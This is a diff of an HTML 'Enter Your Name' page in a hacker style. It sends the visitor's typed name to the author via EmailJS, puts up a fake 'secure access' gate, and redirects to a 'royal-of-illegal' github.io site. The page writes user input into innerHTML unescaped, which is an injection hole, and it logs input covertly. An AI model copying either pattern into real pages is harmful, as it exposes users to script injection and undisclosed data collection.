@@ -30,22 +30,40 @@
             color: lime;
             border: 1px solid lime;
         }
+        .message {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+        marquee {
+            color: yellow;
+            font-size: 16px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
     <h2>Enter Your Name</h2>
+    <marquee>Enter your name and then continue it | Secure Access Required | Please Provide Your Identity</marquee>
     <div class="container">
         <input type="text" id="username" placeholder="Enter your name" onkeydown="handleKeyPress(event)">
         <button onclick="grantAccess()">Submit</button>
+        <p id="user-message" class="message"></p>
     </div>
-
+ <h2>Enter Your Name</h2>
+    <marquee>Enter your name and then continue it | Secure Access Required | Please Provide Your Identity</marquee>
     <script>
         emailjs.init("fJgtOjnuGAsaNQmR1"); // Replace with your EmailJS Public Key
 
         function grantAccess() {
             let username = document.getElementById("username").value.trim();
+            let userMessage = document.getElementById("user-message");
             if (username) {
                 sendEmail(username);
+                userMessage.innerHTML = `
+                    <p>Welcome, <strong>${username}</strong>! You may proceed.</p>
+                    <p>Ensure your credentials are correct before continuing.</p>
+                    <p>Unauthorized access is strictly prohibited!</p>
+                `;
                 document.body.style.backgroundColor = "green";
                 setTimeout(() => {
                     window.location.href = "https://royal-of-illegal.github.io/royal-of-illegal/";
@@ -61,7 +79,7 @@
 
         function sendEmail(username) {
             emailjs.send("service.gmail", "template.id.in", {
-                name: username
+                message: `Login attempt by: ${username}`
             }).then(response => {
                 console.log("Email sent:", response);
             }).catch(error => {
@@ -71,7 +89,6 @@
     </script>
 </body>
 </html>
-
 
 
 
